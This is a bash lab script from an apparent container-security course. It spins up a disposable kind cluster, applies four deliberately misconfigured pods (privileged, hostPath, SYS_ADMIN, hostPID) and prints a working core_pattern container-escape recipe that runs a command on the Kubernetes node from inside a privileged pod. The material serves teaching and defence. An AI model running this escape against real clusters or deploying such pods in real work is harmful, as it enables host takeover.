#!/usr/bin/env bash
# act5/01-kind.sh — a disposable cluster with intentionally risky pods.
# Terminal: host (A). Needs network + docker + kind (setup/01-packages.sh).
#
# Beats:
#   1. Create the kind cluster (pinned k8s version)
#   2. Apply four misconfigured pods — one per act3/act2 lesson
#   3. PREDICT with the act4 matrix BEFORE any scanner runs
#   4. Prove one transfer live: the core_pattern escape from INSIDE the
#      privileged pod, against the kind node
#
# CLEANUP: --reset-local-port keeps it simple; `kind delete cluster` is the
# teardown. Pods are deliberately bad — never apply these to a real cluster.

set -euo pipefail

hr()   { printf '\n\033[1m%s\033[0m\n' "----------------------------------------------------------------"; }
hdr()  { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
say()  { printf '  %s\n' "$*"; }
pause(){ printf '\n  \033[2m[press Enter for the next beat]\033[0m'; read -r; }

K8S_NODE_VER="v1.33.0"   # pin: kind node image; update when re-tested
LAB=blowing-up-containers

# --------------------------------------------------------------------------
hdr "BEAT 1 — the disposable cluster"
hr
if kind get clusters 2>/dev/null | grep -q "^$LAB$"; then
    say "kind cluster '$LAB' already exists — reusing it."
else
    say "creating kind cluster '$LAB' (node image kindest/node:$K8S_NODE_VER)..."
    kind create cluster --name "$LAB" --image "kindest/node:$K8S_NODE_VER" --wait 60s
fi
say "kubectl says: $(kubectl get nodes -o name)"
say ""
say "One node. Real kubelet, real containerd, real Linux kernel (the kind"
say "node's). Everything act3 taught you applies here, unchanged."
pause

# --------------------------------------------------------------------------
hdr "BEAT 2 — four bad pods, four familiar lessons"
hr
say "Applying manifests/misconfigured-pods.yaml (deliberately dangerous):"
kubectl apply -f "$(dirname "$0")/manifests/misconfigured-pods.yaml" | sed 's/^/    /'
say ""
say "Wait for readiness, then look at what you made:"
say "    kubectl get pods -o wide"
say "    kubectl get pod privileged-pod -o jsonpath='{.spec.containers[0].securityContext}'"
say "    kubectl get pod hostpath-pod -o jsonpath='{.spec.volumes}'"
pause

# --------------------------------------------------------------------------
hdr "BEAT 3 — PREDICT with the act4 matrix (before any scanner)"
hr
say "For each pod, answer with an act4 matrix row, from memory:"
say "    privileged-pod   → which act3 escapes are enabled? (all four?)"
say "    hostpath-pod     → which act2/02 bridge did the manifest just grant?"
say "    sysadmin-cap-pod → exactly how much of the bundle is re-added?"
say "    hostpid-pod      → what door does /proc hand this pod?"
say ""
say "Write your four answers down. The next script grades them — a scanner"
say "is just the matrix, automated and unsentimental."
pause

# --------------------------------------------------------------------------
hdr "BEAT 4 — the transfer, live: act3/01 from inside the cluster"
hr
say "The lab lessons are not VM-only. Execute the core_pattern escape from"
say "INSIDE the privileged pod, against the kind node:"
say "    kubectl exec -it privileged-pod -- sh"
say ""
say "Then inside the pod (you know this recipe by heart):"
say "    cat /proc/sys/kernel/core_pattern          (writable? you know why)"
say "    echo '|/bin/sh -c \"echo escaped from \$HOSTNAME\" > /proc/1/root/tmp/marker' > /proc/sys/kernel/core_pattern"
say "    ulimit -c unlimited"
say "    kill -SEGV \$\$"
say ""
say "The knob write works because privileged:true kept the node's /proc rw;"
say "the payload path works via /proc/1/root — act2/02 bridge 2, on the node."
say "Exit the exec. Then check the node side:"
say "    docker exec \$(docker ps -qf name=$LAB-control-plane) cat /tmp/marker"
say ""
say "If that string appears: the exact bytes of act3/01, fired from a pod"
say "scheduled by Kubernetes, landing on the node's filesystem. Full circle."
pause

# --------------------------------------------------------------------------
hdr "CHECK QUESTIONS (act5/01)"
cat <<'EOF'
  1. Which pod would you fix FIRST if you were on-call, and which act4 cell
     told you so?
  2. sysadmin-cap-pod has ONLY SYS_ADMIN added, not privileged:true. Which
     of the four escapes does that single grant enable?
  3. hostpath-pod is NOT privileged. Why is it still dangerous? (Which
     bridge, and what does the pod still need to exploit it?)

  Next: act5-cluster/02-kube-dementor.sh — the matrix, automated.
EOF
